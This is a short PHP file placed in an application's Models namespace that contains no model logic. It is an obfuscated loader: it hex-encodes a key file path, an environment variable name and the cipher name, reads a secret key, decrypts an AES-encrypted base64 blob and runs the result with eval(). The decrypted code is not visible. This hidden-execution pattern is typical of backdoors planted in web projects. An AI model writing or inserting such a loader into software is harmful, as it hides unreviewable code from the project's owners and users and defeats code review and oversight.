<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('FXWxjic7pnhWNfAKGNjM6g==');
$c=base64_decode(
'sPoyJ8jmoDWs2v5uawipzVKw+T2kgiG0hmbJUlXjK7/v//1s9lH5/novyEOoiI2Bjy2EA2EU6gzo' .
'0IPz5cm4nJCrsalKnOgoguRvGES8Lz6XnBAjVPpCeLA16vO9iIu0tsy4UQvg6jQO4ekJGwYURLsx' .
'znAV9EJE33Q59NJ4z4lXr7I5Kymc2BRKM8yxGbcI7wtmcXxy2aA22khDvJiJ3x58A35vsWV9p+da' .
'jPOzI/usFbLq2yLgCK96WQtwiRYiXU27ESKlPIZul+qZlqm4ctLPGbIK1yFTCImqlo4KWeFuGK+S' .
'5FHiAB/srvhbIv6AvAEYoHTAqbTPRIeNCEX5OgU7C0YL7Qa8QhoMji8BtLnJ5830MxfqSQ8x3DpE' .
'oMcY7Nb2Q5+iu/kpEb0qmmFOfhpliVPxFevTFPZ+Zkn02Yu3qQeGFeJB+RjuUb5tk9qMpSTM0NT4' .
'fSrYAye/jZout2dcQPWBWd6VF5O9icbEn79E5f+c+RthurcMDAgfls2JSxoY2dX9SVBDWRRXC0a1' .
'rfPyDg2gBSPYIH598IexdYgJef5X9TbCFdPIJAXlmhS2vFXbS+xeu6yvzK//ISSZGePp1HaGsyOY' .
'njx/T3GQ2w6cGAel7UVqxi0bLtGTGHOWVXwSwQbtneIKjmQ5C+M95FRK6l2iVXmhcopnxHaPIhfM' .
'PF6X60Jk/Q71g+MUf4Z0xu/0cjmueqdf8/x2yRJgXtMcKNac7kGZpNVdfBUQ1gktkvcuJlEugVF3' .
'MH5WMiOv9nu0sq9dunak7pcn8GuPKA=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
